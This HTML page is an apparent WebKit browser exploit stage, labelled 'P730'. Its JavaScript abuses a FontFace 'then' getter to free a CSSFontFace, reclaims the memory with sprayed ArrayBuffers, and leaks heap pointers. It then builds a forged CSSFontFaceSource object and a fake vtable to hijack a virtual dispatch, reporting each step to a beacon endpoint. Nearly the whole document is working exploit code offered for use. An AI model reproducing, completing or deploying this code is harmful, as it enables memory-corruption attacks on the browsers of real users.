<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P730 — CSSFontFace Load Dispatch & Vtable Dereference Scout</title>
<script>
'use strict';
/* ============================================================
 * P730 — CSSFontFace Load Dispatch & Vtable Dereference Scout
 *
 * Ground Truth from P728/P729:
 * 1. 100% deterministic reclaim of CSSFontFace at buffer #68.
 * 2. q11 (m_buffer) holds the genuine backing buffer allocated by WebKit.
 * 3. q12 holds (m_capacity << 32 | m_size).
 * 4. WTF::Vector m_sources holds Ref<CSSFontFaceSource> pointers.
 *
 * Objectives of P730:
 * 1. Capture genuine original_m_buffer pointer (q11).
 * 2. Stage A: Call document.fonts.load('1em trFam') with m_size=0.
 *             Confirm CSSFontFace::load() dispatch mechanics cleanly.
 * 3. Stage B: Repoint m_buffer to P58 with m_size=1, m_capacity=1.
 *             Construct a self-contained fake CSSFontFaceSource object hierarchy:
 *               m_buffer[0] = P58 + 0x40  (Fake Object at q8)
 *               Fake Object vptr = P58 + 0x80 (Fake Vtable at q16)
 * 4. Stage C: Probe execution and monitor diffSnap across all 24 quadwords.
 * ============================================================ */

function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }

function b(tag,data){ try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P730-'+encodeURIComponent(tag)+
    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
  x.send(null);}catch(e){} }

function log(s){
  var el = document.getElementById('out');
  if(el) el.textContent += s + '\n';
}

var P58 = null, P68 = null;
var FACE_B = null, BUF_B = null, VIEW_B = null;
var ORIG_Q11 = 0n;

function snap(){
  if(!VIEW_B) return [];
  var arr = [];
  for(var q=0; q<24; q++) arr.push(VIEW_B[q]);
  return arr;
}

function diffSnap(pre){
  if(!VIEW_B || !pre.length) return 'none';
  var ch = [];
  for(var q=0; q<24; q++){
    if(VIEW_B[q] !== pre[q]){
      ch.push('q' + q + '=0x' + h16(VIEW_B[q]));
    }
  }
  return ch.length ? ch.join(',') : 'none';
}

function run(){
  b('BOOT','p730-vtable-scout');
  log('=== P730 CSSFontFace Load Dispatch & Vtable Scout ===\n');

  /* Step 1: Baseline Leak */
  log('[Step 1] Baseline heap leak...');
  doLeak(function(){
    log('P58 = 0x' + h16(P58));
    log('P68 = 0x' + h16(P68) + '\n');

    /* Step 2: Deterministic Reclaim */
    log('[Step 2] Executing deterministic reclaim...');
    doReclaim(function(){
      /* Step 3: Test Load Dispatch */
      log('\n[Step 3] Testing CSSFontFace::load() dispatch...');
      testDispatch();
    });
  });
}

/* ---- Step 1: Baseline Leak ---- */
function doLeak(cb){
  b('LEAK-GO','');
  var st = document.createElement('style');
  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
  document.head.appendChild(st);

  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
  document.fonts.add(face);
  void face.loaded;

  var abs = [], fired = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired) return undefined; fired=true;
      if(st){st.remove(); st.textContent=''; st=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk0');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl0, lk0','AB');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs.length;i++){
      var u=new Uint8Array(abs[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }

    if(best<0 || bestNz<4){
      b('LEAK-MISS','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    var v = new BigUint64Array(abs[best]);
    extractPointers(v);

    if(!P58){
      b('LEAK-NOPTR','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
    setTimeout(cb, 100);
  }, 350);
}

function doLeakRetry(cb){
  b('LEAK-RETRY','');
  var st2 = document.createElement('style');
  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
  document.head.appendChild(st2);

  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
  document.fonts.add(face2);
  void face2.loaded;

  var abs2 = [], fired2 = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired2) return undefined; fired2=true;
      if(st2){st2.remove(); st2.textContent=''; st2=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk1');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl1, lk1','CD');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs2.length;i++){
      var u=new Uint8Array(abs2[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }
    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
    var v = new BigUint64Array(abs2[best]);
    extractPointers(v);
    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
    setTimeout(cb, 100);
  }, 400);
}

function extractPointers(v){
  var LOW = BigInt('0x1000000000');
  var HIGH = BigInt('0x80000000000');
  for(var q=0;q<24;q++){
    var val = v[q];
    if(val >= LOW && val < HIGH){
      if(!P58) P58 = val;
      else if(!P68 && val !== P58) P68 = val;
    }
  }
  if(!P68) P68 = 0n;
}

/* ---- Step 2: Deterministic Reclaim ---- */
function doReclaim(cb){
  b('REC-START', 'fill_q12_q6=0x' + h16(P58));

  var stTr = document.createElement('style');
  stTr.textContent = '@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
  document.head.appendChild(stTr);

  FACE_B = new FontFace('trFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
  document.fonts.add(FACE_B);
  void FACE_B.loaded;

  var absW = [], firedW = false;

  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if(firedW) return undefined; firedW = true;
      if(stTr){ stTr.remove(); stTr.textContent = ''; }
      try{ document.fonts.delete(this); }catch(e){}
      document.body.offsetHeight;

      for(var k=0; k<80; k++){
        var ab = new ArrayBuffer(192);
        var view = new BigUint64Array(ab);
        view[12] = P58;
        view[6]  = P58;
        absW.push(ab);
      }

      try{ document.fonts.check('1em trFam'); }catch(e){}
      return undefined;
    }, set: function(){}
  });

  document.fonts.load('1em trFace, trFam', 'GH');

  setTimeout(function(){
    delete FontFace.prototype.then;

    var best = -1, bestNz = 0;
    for(var i=0; i<absW.length; i++){
      var u = new Uint8Array(absW[i]), nz = 0;
      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
      if(nz > bestNz){ bestNz = nz; best = i; }
    }

    if(best < 0 || bestNz < 4){
      b('RECLAIM-MISS', 'nz=' + bestNz);
      log('Reclaim missed!');
      return;
    }

    BUF_B = absW[best];
    VIEW_B = new BigUint64Array(BUF_B);
    ORIG_Q11 = VIEW_B[11];

    b('RECLAIM-OK', 'baseK=' + best + '|origQ11=0x' + h16(ORIG_Q11) + '|origQ12=0x' + h16(VIEW_B[12]));
    log('Deterministic Reclaim OK: origQ11 = 0x' + h16(ORIG_Q11));

    setTimeout(cb, 100);
  }, 400);
}

/* ---- Step 3: Test Load Dispatch ---- */
function testDispatch(){
  if(!VIEW_B) return;

  /* Stage A: Dispatch with m_size = 0 (clean baseline) */
  VIEW_B[12] = 0x0000002000000000n; /* cap=32, size=0 */
  var preSnap = snap();
  var loadP1 = null, err1 = 'none';
  try {
    loadP1 = document.fonts.load('1em trFam');
    b('DISPATCH-ZERO-OK', 'type=' + typeof loadP1 + '|writes=' + diffSnap(preSnap));
  } catch(e){
    err1 = e.message;
    b('DISPATCH-ZERO-ERR', err1);
  }

  /* Stage B: Construct controlled fake object in VIEW_B
   * We craft:
   *   q0: RefCount = 1
   *   q1..q3: Target leak pointers (P68)
   *   q6: P58 (anchor)
   *   q8..q10: Fake CSSFontFaceSource object (vptr at q8 = P58 + 0x80)
   *   q11: P58 (m_buffer points to element 0 at VIEW_B[0])
   *   q12: 0x0000000100000001n (capacity = 1, size = 1 element!)
   *   q13: P68 (WeakPtr address)
   *   q16..q23: Fake Vtable entries (pointing back safely to P58)
   */
  VIEW_B[0] = P58 + 0x40n; /* Element 0: Pointer to Fake Object at q8 (+64B) */
  VIEW_B[1] = P68;
  VIEW_B[2] = P58;
  VIEW_B[3] = 0x0n;

  VIEW_B[8] = P58 + 0x80n; /* Fake Object q8: vptr points to Fake Vtable at q16 (+128B) */
  VIEW_B[9] = 0x1n;        /* RefCount of source */
  VIEW_B[10] = P68;        /* Target heap pointer */

  /* Fake Vtable slots at q16..q23 */
  for(var v=16; v<24; v++){
    VIEW_B[v] = P58 + 0x40n; /* Each method pointer points back to safe anchor */
  }

  /* Point m_buffer to P58, set size = 1, capacity = 1 */
  VIEW_B[11] = P58;
  VIEW_B[12] = 0x0000000100000001n;

  b('FORGE-STRUCT-OK', 'elem0=0x' + h16(VIEW_B[0]) + '|vptr=0x' + h16(VIEW_B[8]));

  /* Stage C: Trigger fonts.load('1em trFam') on the forged object */
  preSnap = snap();
  var loadP2 = null, err2 = 'none';
  try {
    loadP2 = document.fonts.load('1em trFam');
    b('DISPATCH-FORGE-OK', 'type=' + typeof loadP2 + '|writes=' + diffSnap(preSnap));
  } catch(e){
    err2 = e.message;
    b('DISPATCH-FORGE-ERR', err2);
  }

  /* Stage D: Measure font with Canvas */
  try {
    var ctx = document.createElement('canvas').getContext('2d');
    ctx.font = '20px trFam';
    var m = ctx.measureText('TEST');
    b('CANV-FORGE-MEASURE', 'w=' + m.width + '|writes=' + diffSnap(preSnap));
  } catch(e){
    b('CANV-FORGE-ERR', e.message);
  }

  /* Stage E: Final State */
  var finalDump = [];
  for(var q=0; q<16; q++) finalDump.push('q' + q + '=0x' + h16(VIEW_B[q]));
  b('FINAL-STATE', finalDump.join(';').slice(0, 700));

  b('DONE', 'p730-complete');
  log('\n=== P730 Complete! ===');
}

if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
else document.addEventListener('DOMContentLoaded',run);
</script>
</head><body><pre id="out">P730 — CSSFontFace Load Dispatch & Vtable Scout running...</pre></body></html>
